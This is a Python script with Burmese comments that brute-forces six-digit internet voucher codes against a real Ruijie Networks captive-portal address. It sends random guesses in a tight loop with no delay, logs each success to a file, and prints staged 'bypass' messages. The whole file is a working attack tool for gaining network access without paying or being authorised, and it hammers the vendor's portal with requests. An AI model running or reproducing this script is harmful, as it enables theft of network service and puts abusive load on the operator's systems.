import time
import random
import os
import sys
import requests
from datetime import datetime

# အရောင်များ
RED = '\033[91m'
GREEN = '\033[92m'
WHITE = '\033[97m'
CYAN = '\033[96m'
END = '\033[0m'

# Portal Address
url = "https://portal-as.ruijienetworks.com"

def start_bruteforce():
    os.system('clear')
    print(f"{CYAN}[+] Checking Bypass...{END}")
    time.sleep(0.2)
    print(f"{CYAN}[+] Done.{END}")
    time.sleep(0.2)
    print(f"{CYAN}[+] 1-Trying to connect server...{END}")
    time.sleep(0.3)
    print(f"{WHITE}[+] Connection to Server: {GREEN}OK{END}\n")

    while True:
        code = str(random.randint(0, 999999)).zfill(6)
        params = {'voucher': code, 'method': 'login'}

        try:
            # Timeout ကို 0.3s အထိလျှော့ချပြီး အမြန်နှုန်းမြှင့်တင်ထားသည်
            res = requests.get(url, params=params, timeout=0.3)
            
            if res.status_code == 200 and "success" in res.text.lower():
                print(f"{GREEN}Success Code: {code}{END}")
                with open("success.txt", "a") as f:
                    f.write(f"Voucher: {code} | {datetime.now().strftime('%H:%M:%S')}\n")
                break
            else:
                # အနီရောင် Fail Code သီးသန့်
                print(f"{RED}Fail Code: {code}{END}")
                
        except:
            # Server Timeout ဖြစ်လျှင်လည်း အနီရောင်ဖြင့် ချက်ချင်းပြရန်
            print(f"{RED}Fail Code: {code}{END}")
        
        # Sleep ကို လုံးဝဖြုတ်လိုက်ခြင်းဖြင့် အမြင့်ဆုံးမြန်နှုန်း ရရှိစေသည်
        # (စက်အရမ်းပူလာလျှင် time.sleep(0.01) ဟု ပြန်ထည့်နိုင်သည်)

if __name__ == "__main__":
    os.system('clear')
    print(f"{WHITE}[1] Get Internet Access\n[2] Bruteforce Access Voucher Code\n[3] Recheck Success Code{END}\n")
    
    try:
        option = input(f"{WHITE}Enter an Option: {END}")
        if option == '2':
            start_bruteforce()
        elif option == '3':
            if os.path.exists("success.txt"):
                with open("success.txt", "r") as f:
                    print(f"\n{GREEN}{f.read()}{END}")
            else:
                print(f"\n{RED}No codes saved yet.{END}")
        else:
            sys.exit()
    except EOFError:
        sys.exit()
